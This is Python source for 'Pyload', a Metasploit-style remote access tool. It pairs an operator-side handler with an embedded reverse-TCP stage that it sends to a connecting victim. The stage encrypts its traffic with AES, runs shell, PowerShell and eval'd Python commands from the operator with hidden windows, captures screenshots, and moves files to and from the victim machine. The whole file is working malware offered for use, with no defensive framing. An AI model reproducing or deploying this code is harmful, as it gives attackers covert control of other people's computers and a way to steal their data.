import socket, base64, time, os, sys, random
from Crypto.Cipher import AES

from Crypto import Random

rev_tcp = r"""
import socket, os, sys, base64, binascii, subprocess, threading, time, random
from Crypto.Cipher import AES


def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)

def encriptString(x):
    message = pad(x)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(encriptKey, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def decriptString(x):
    iv = x[:AES.block_size]
    cipher = AES.new(encriptKey, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(x[AES.block_size:])
    return plaintext.rstrip(b"\0")



def docommand():
    print "doit"
    global fitn
    CREATE_NO_WINDOW = 0x08000000
    output = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              creationflags=CREATE_NO_WINDOW)
    out = output.communicate()[0]
    sock.sendall(out)
    if out > 0:
        fin = 1
    print out


class GetOutOfLoop(Exception):
    pass


try:
    print "tried"
    while True:
        sendback = True
        try:
            data = decriptString(sock.recv(65536))
            if ("cd " in data and sendback == True):
                try:
                    sendback = False
                    os.chdir(data[3:])
                    sock.sendall(encriptString(os.popen("dir").read()))
                except:
                    sock.sendall(encriptString("No Such Directory"))
            elif "python " in data and sendback == True:
                sendback = False
                try:
                    output = eval(data[7:])
                    sock.sendall(encriptString(output))
                except:
                    sock.sendall(encriptString("Python Command Failed or No Output"))

            elif "powershell " in data and sendback == True:
                sendback = False
                fin = 0
                Thread = threading.Timer(fin, docommand)
                Thread.daemon = True
                Thread.start()
                time.sleep(10)
                print ('timer')
                if fin == 0:
                    Thread.cancel()
                    print 'fail'
                    sock.sendall(encriptString("Powershell Command Failed"))

            elif "_screenshot_" in data and sendback == True:
                try:
                    sendback = False
                    randomnum = random.randrange(1, 3057098743573230598)
                    TEMP = str(os.environ['TEMP'])
                    name = TEMP + '\+~JF' + str(randomnum) + '.bmp'
                    from PIL import ImageGrab

                    im = ImageGrab.grab()
                    im.save(name)
                    time.sleep(0.3)
                    with open(name, "rb") as image_file:
                        encoded_string = base64.b64encode(image_file.read())

                    sock.sendall(encriptString(encoded_string))
                    im.close()
                    os.remove(name)
                except:
                    sock.sendall(encriptString("Screenshot Failed"))

            elif "_donwload_" in data and sendback == True:
                sendback = False
                location = data[11:]
                print location
                with open(location, "rb") as image_file:
                    encoded_string = base64.b64encode(image_file.read())
                sock.sendall(encriptString(str(len(encoded_string))))
                time.sleep(2)
                sock.sendall(encriptString(encoded_string))


            elif "_upload_" in data and sendback == True:
                sendback = False
                name = data[9:]
                num = decriptString(sock.recv(10000))
                filecon = decriptString(sock.recv(int(num)))
                print (filecon)
                fh = open(name, "wb")

                fh.write(filecon.decode('base64'))
                fh.close()

            else:
                fin = 0
                Thread = threading.Timer(fin, docommand)
                Thread.daemon = True
                Thread.start()
                time.sleep(1.5)
                if fin == 0:
                    print ("Fail")
                    sock.sendall(encriptString("Command Failed"))
                    Thread.cancel()
        except:
            break
except GetOutOfLoop:
    pass

"""
###NORMAL STAGE WITH SHELL,PYTHON,POWERSHELL ACCESS###
pyType = ""

###Setup Encriptor
primeN = 3534635645620271361541209209607897224734887106182307093292005188843884213420695035531516325888970426873310130582000012467805106432116010499008974138677724241907444538851271730464985654882214412422106879451855659755824580313513382070785777831859308900851761495284515874808406228585310317964648830289141496328996622685469256041007506727884038380871660866837794704723632316890465023570092246473915442026549955865931709542468648109541
privateAA = random.randint(0, primeN)
publicAA = pow(2, privateAA, primeN)


def encriptionKey(x):
    publicB = clientsocket.recv(1024)
    privateA = privateAA
    publicA = publicAA
    clientsocket.sendall(str(publicA))
    encriptionkey = str(pow(int(publicB), privateA, primeN))
    print "KEY: " + str(encriptionkey)
    enckey = str(encriptionkey)[4:36]
    return enckey


def pad(s):
    return s + b"\0" * (AES.block_size - len(s) % AES.block_size)


def encriptString(x):
    message = pad(x)
    iv = Random.new().read(AES.block_size)
    cipher = AES.new(encriptKey, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(message)


def decriptString(x):
    iv = x[:AES.block_size]
    cipher = AES.new(encriptKey, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(x[AES.block_size:])
    return plaintext.rstrip(b"\0")


while True:
    os.system('clear')
    print (' _______  ____  ____  _____       ___        _       ______    ')
    print ("|_   __ \|_  _||_  _||_   _|    .'   `.     / \     |_   _ `.  ")
    print ('  | |__) | \ \  / /    | |     /  .-.  \   / _ \      | | `. \ ')
    print ("  |  ___/   \ \/ /     | |   _ | |   | |  / ___ \     | |  | | ")
    print (" _| |_      _|  |_    _| |__/ |\  `-'  /_/ /   \ \_  _| |_.' / ")
    print ("|_____|    |______|  |________| `.___.'|____| |____||______.'  ")
    print ('                                                               ')
    print ('                                                               ')

    # This is to get ip of Servers computer
    ipsocket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ipsocket.connect(("google.com", 80))
    ip = ipsocket.getsockname()[0]
    ipsocket.shutdown(0.2)
    ipsocket.close()
    ###
    LoopA = True
    LoopB = False
    exploit = False

    while LoopA:
        if pyType == "":
            Interface = "Pyload > "
            pyInput = raw_input(Interface)
            if "use " in pyInput:
                if pyInput == "use payload/rev_tcp/staged" or pyInput == "use staged":
                    pyType = "payload/rev_tcp/staged"
                    LoopB = True
                elif pyInput == "use payload/rev_tcp/stageless" or pyInput == "use stageless":
                    pyType = "payload/rev_tcp/stageless"
                    LoopB = True
                else:
                    print (pyInput[4:] + " payload not found")
                    os.system('clear')
            elif pyInput == 'help' or pyInput == "/help":
                print ("\n------------------------------------------------------------------------\n")
                print ("Mandatory:")
                print ("    use ...")
                print ("        payload/rev_tcp/staged or staged")
                print ("        payload/rev_tcp/stageless or stageless")
                print ("                                                                            ")
                print ("Commands:")
                print ("    exit                                    Exit from Pyload                ")
                print ("\n------------------------------------------------------------------------\n")

            elif pyInput == "use":
                print ("\n------------------------------------------------------------------------\n")
                print ("use ...")
                print ("    payload/rev_tcp/staged")
                print ("    payload/rev_tcp/stageless")
                print ("\n------------------------------------------------------------------------\n")
            elif pyInput == "exit":
                sys.exit(0)
            else:
                print ("\nCommand Not Found\n")
        if pyType != "":
            LoopB = True
        while LoopB:
            Interface = "Payload " + pyType[8:] + " > "
            pyCommand = raw_input(Interface)
            if pyCommand == 'help' or pyCommand == "/help":
                print ("\n------------------------------------------------------------------------\n")
                print ("Commands:                                                                   ")
                print ("    back                                    reconfigure handler             ")
                print ("    exit                                    Exit from Pyload                ")
                print ("    exploit                                 start listener/handler          ")
                print ("\n------------------------------------------------------------------------\n")
            elif pyCommand == "back":
                pyType = ""
                LoopA = True
                LoopB = False
            elif pyCommand == "exit":
                sys.exit(0)
            elif pyCommand == "exploit":
                exploit = True
                LoopA = False
                LoopB = False
            else:
                print ("\nCommand Not Found\n")

    if exploit:
        location = ''
        if pyType == "payload/rev_tcp/staged":
            port = 1040
        elif pyType == "payload/rev_tcp/stageless":
            port = 1020
        print ("\nSearching For Client...\n")
        serveSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serveSock.bind((ip, port))
        serveSock.listen(5)
        clientsocket, address = serveSock.accept()
        encriptKey = ""
        encriptKey = encriptionKey(encriptKey)
        if pyType == "payload/rev_tcp/staged":
            print ("Sending Stage to " + str(address[0]))
            clientsocket.sendall(encriptString(rev_tcp))
        print ("Connection established on " + str(address[0]) + " on port " + str(address[1]))
        print "Secure connection has been established..."
        while True:
            inputte = raw_input('Client' + ' > ')

            if len(inputte) != 0:

                if '/help' in inputte:
                    print("\n\n"
                          "...             Any Shell Command")
                    print("python ...     Any Python Command")
                    print("powershell ... Any Powershell Command (Warrning No Freeze Protection)")
                    print("/upload         Upload file to Client")
                    print("/download       Upload file to Client")
                    print("/fix            Fix Delays In Network Connection")
                    print("/screenshot     Takes Screenshot of Client Screen")
                    print("/quitClient     Closes Client")
                    print("/exit           Quit Handler"
                          "\n\n")

                elif '/upload' in inputte:
                    location = raw_input("Type In Folder Location\n")
                    name = raw_input("Type In File Name\n")
                    location = location + name
                    with open(location, "rb") as image_file:
                        encoded_string = base64.b64encode(image_file.read())
                    clientsocket.sendall(encriptString("_upload_ " + name))
                    clientsocket.sendall(encriptString(str(len(encoded_string))))
                    time.sleep(1)
                    clientsocket.sendall(encriptString(encoded_string))

                elif '/fix' in inputte:
                    extra = decriptString(clientsocket.recv(1048576))
                    print (extra)

                elif '/screenshot' in inputte:
                    clientsocket.sendall(encriptString('_screenshot_'))
                    encoded_string = decriptString(clientsocket.recv(10000000))
                    fh = open('Screenshot.png', "wb")
                    fh.write(encoded_string.decode('base64'))
                    fh.close()
                    print "Done, saved to " + os.getcwd()

                elif '/download' in inputte:
                    clientsocket.sendall(encriptString('dir'))
                    print (decriptString(clientsocket.recv(1048576)))
                    location = raw_input("Type In File Location\n")
                    clientsocket.sendall(encriptString("_donwload_ " + location))
                    num = decriptString(clientsocket.recv(10000))
                    filecon = decriptString(clientsocket.recv(int(num)))
                    filename = raw_input("File Recived!\nType In New File Name\n")
                    fh = open(filename, "wb")
                    fh.write(filecon.decode('base64'))
                    fh.close()

                elif "/exit" in inputte:
                    if pyType == "payload/rev_tcp/staged":
                        clientsocket.sendall(encriptString('_break_'))
                    serveSock.close()
                    clientsocket.close()
                    break

                else:

                    clientsocket.sendall(encriptString(inputte))

                    try:
                        data = decriptString(clientsocket.recv(1048576))
                        formated = data
                        print ('\n' + formated + '\n')
                    except:
                        pass
